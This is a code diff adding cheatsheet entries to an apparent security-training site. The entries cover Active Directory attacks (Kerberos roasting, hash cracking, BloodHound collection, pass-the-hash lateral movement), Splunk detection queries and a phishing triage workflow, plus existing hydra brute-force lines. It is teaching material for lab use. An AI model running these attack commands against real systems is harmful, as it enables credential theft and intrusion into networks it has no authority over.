@@ -58,4 +58,34 @@ export const cheatsheets = [
       { title: "Online (lab login forms only)", commands: ["hydra -l labuser -P words.txt 192.168.56.101 ssh", "hydra -l admin -P words.txt 192.168.56.102 http-post-form '/login.php:u=^USER^&p=^PASS^:F=incorrect'"] },
     ],
   },
+  {
+    id: "active-directory",
+    title: "Active Directory attacks (lab domain only)",
+    icon: "🏰",
+    sections: [
+      { title: "Enumeration", commands: ["enum4linux -a 192.168.56.10              # lab DC", "ldapsearch -x -H ldap://192.168.56.10 -b 'DC=lab,DC=local' '(objectClass=user)' sAMAccountName", "crackmapexec smb 192.168.56.10 -u guest -p '' --shares   # lab"] },
+      { title: "Kerberos roasting", commands: ["GetNPUsers.py lab.local/ -usersfile users.txt -no-pass -dc-ip 192.168.56.10", "GetUserSPNs.py lab.local/svc:Passw0rd -dc-ip 192.168.56.10 -request", "hashcat -m 13100 tgs.txt rockyou.txt     # crack YOUR lab hashes"] },
+      { title: "Path finding & lateral movement", commands: ["SharpHound.exe -c All --zipfilename loot.zip   # on lab Windows VM", "# import into BloodHound → 'Shortest Paths to Domain Admins'", "wmiexec.py -hashes :<NTLM> lab.local/admin@192.168.56.10   # lab only"] },
+    ],
+  },
+  {
+    id: "siem-splunk",
+    title: "Splunk / SIEM detection queries (lab data)",
+    icon: "📊",
+    sections: [
+      { title: "Brute force (Windows)", commands: ["index=windows EventCode=4625 | stats count by src_ip, user | where count > 5", "index=linux 'Failed password' | stats count by src | sort -count | head"] },
+      { title: "Backdoor / exploitation", commands: ["index=windows EventCode=4688 Image=*\\\\nc.exe   # netcat execution", "index=network dest_port=6200   # vsftpd backdoor connections (Suricata/Zeek feed)"] },
+      { title: "Dashboards & alerts", commands: ["# Save queries as reports → Dashboard panels", "# Alert action: email / webhook / notable event when count > threshold"] },
+    ],
+  },
+  {
+    id: "phishing-triage",
+    title: "Phishing triage workflow",
+    icon: "🎣",
+    sections: [
+      { title: "Extract & defang IOCs", commands: ["# parse headers: Received chain, SPF/DKIM/DMARC (Authentication-Results)", "grep -oE 'https?://[^ ]+' email.eml | sed 's/http/hxxp/g'   # defang URLs", "grep -oE '[0-9]{1,3}(\\.[0-9]{1,3}){3}' email.eml | sort -u     # IPs"] },
+      { title: "Enrich", commands: ["whois suspicious-domain.com", "curl -s 'https://www.virustotal.com/api/v3/urls/<base64-url>' -H 'x-apikey: $VT_KEY'", "curl -s 'https://urlscan.io/api/v1/search/?q=domain:suspicious-domain.com'"] },
+      { title: "Verdict & mapping", commands: ["# document: true positive / benign + evidence", "# map to MITRE ATT&CK: T1566 Phishing, T1204 User Execution, T1071 C2"] },
+    ],
+  },
 ];
